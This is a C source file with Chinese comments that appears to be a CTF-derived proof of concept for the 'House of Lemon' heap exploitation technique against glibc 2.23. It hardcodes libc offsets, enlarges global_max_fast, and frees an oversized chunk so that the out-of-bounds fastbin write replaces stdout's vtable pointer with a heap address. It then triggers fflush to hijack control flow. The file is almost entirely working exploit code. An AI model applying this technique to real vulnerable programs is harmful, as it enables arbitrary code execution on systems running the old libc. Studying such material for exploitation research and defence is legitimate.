/*
 * House of Lemon：针对 glibc 2.23（Ubuntu 16.04 首发的那个 libc 版本）
 * 写的最小可执行 PoC。
 *
 * 这里的目标不是复刻原题的菜单交互，而是单独证明 House of Lemon 最关键
 * 的两步：
 *   1. 已经拿到一次 libc 任意写之后，把 global_max_fast 改大；
 *   2. free 一个 0x17c0 的 chunk，让计算出来的 fastbin_index 越过
 *      fastbinsY 数组，恰好把 chunk 地址写到 _IO_2_1_stdout_.vtable 上；
 *      随后调用 fflush(stdout) 就会跳进堆上这个伪造的 vtable。
 *
 * 运行环境必须是本项目准备好的 2.23-0ubuntu3_amd64。global_max_fast 是
 * glibc 的一个 hidden 符号，这份 PoC 用它相对 _IO_2_1_stdout_ 在该构建
 * 下的固定偏移来定位。换成别的附件 libc 时，请先按 README 里给出的公式
 * 重新计算偏移，不能直接照抄这里的数值。
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* 以下分析对应 Ubuntu 打包的 glibc 2.23-0ubuntu3：
 *   _IO_2_1_stdout_ = libc + 0x3c4620
 *   main_arena      = libc + 0x3c3b20
 *   global_max_fast = libc + 0x3c5848
 */
#define MAIN_ARENA_FROM_STDOUT      (-0xb00L)
#define GLOBAL_MAX_FAST_FROM_STDOUT  0x1228L

/* malloc(0x17b0) 在 x86-64 上得到 size=0x17c0 的 chunk。 */
#define REQUEST_SIZE 0x17b0
#define CHUNK_SIZE   0x17c0

static void win(void)
{
    static const char message[] =
        "[+] House of Lemon: stdout 的虚表调用已经劫持到堆上。\n";

    /* stdout 已被破坏，不能再用 printf/puts；直接使用 write。 */
    (void)write(STDOUT_FILENO, message, sizeof(message) - 1);
    _exit(0);
}

int main(void)
{
    unsigned char *stdout_object;
    unsigned char *main_arena;
    size_t *global_max_fast;
    void **user;
    void **fake_vtable;
    void **stdout_vtable_slot;
    size_t index;
    size_t expected_size;

    /* dlsym 返回 FILE 对象本身，不是 stdout 这个 FILE * 全局变量的地址。 */
    stdout_object = dlsym(RTLD_DEFAULT, "_IO_2_1_stdout_");
    if (stdout_object == NULL)
        return 1;

    main_arena = stdout_object + MAIN_ARENA_FROM_STDOUT;
    global_max_fast = (size_t *)(stdout_object +
                                GLOBAL_MAX_FAST_FROM_STDOUT);

    /* _IO_FILE_plus 在 glibc 2.23 x86-64 中的 vtable 位于对象 +0xd8。 */
    stdout_vtable_slot = (void **)(stdout_object + 0xd8);

    /* 源码里的关系：fastbinsY 数组起始于 main_arena+8，每一项占 8 字节;
     * fastbin 的索引计算公式是 fastbin_index(size) = (size >> 4) - 2。
     */
    index = ((uintptr_t)stdout_vtable_slot -
             ((uintptr_t)main_arena + 8)) / sizeof(void *);
    expected_size = (index + 2) << 4;
    if (expected_size != CHUNK_SIZE)
        return 2;

    /* 让 stdout 进入稳定的已初始化状态；之后不再调用 stdio 输出。 */
    if (setvbuf(stdout, NULL, _IONBF, 0) != 0)
        return 3;

    user = malloc(REQUEST_SIZE);
    if (user == NULL)
        return 4;

    /* fake_vtable 指向 chunk header，而 user 指向 header+0x10。
     * free 会覆盖 user[0]（也就是 fake_vtable[2]），所以要从 user[1]
     * 开始填。fflush 用到的 __sync 槽同样会命中 win；多填几个槽是为了
     * 方便在调试时单步观察。
     */
    fake_vtable = user - 2;
    for (size_t i = 1; i < 32; ++i)
        user[i] = (void *)win;

    /* 原题是通过 unsafe unlink 拿到这次写能力的。这里直接把“已经具备一次
     * libc 任意写”当作前置原语给出，这样就能把 PoC 的重点聚焦在 Lemon
     * 独有的 fastbin 越界写上。
     */
    *global_max_fast = 0x2000;

    /* 2.23 的 _int_free 先判断 size <= global_max_fast，再计算不带边界
     * 检查的 fastbin_index，于是 *stdout_vtable_slot 就被写成了 chunk
     * header 的地址。
     */
    free(user);

    if (*stdout_vtable_slot != fake_vtable)
        _exit(5);

    /* glibc 2.23 还没有 2.24 才引入的 IO_validate_vtable 检查，所以会
     * 接受这个指向堆的伪造 vtable。 */
    (void)fflush(stdout);
    _exit(6);
}
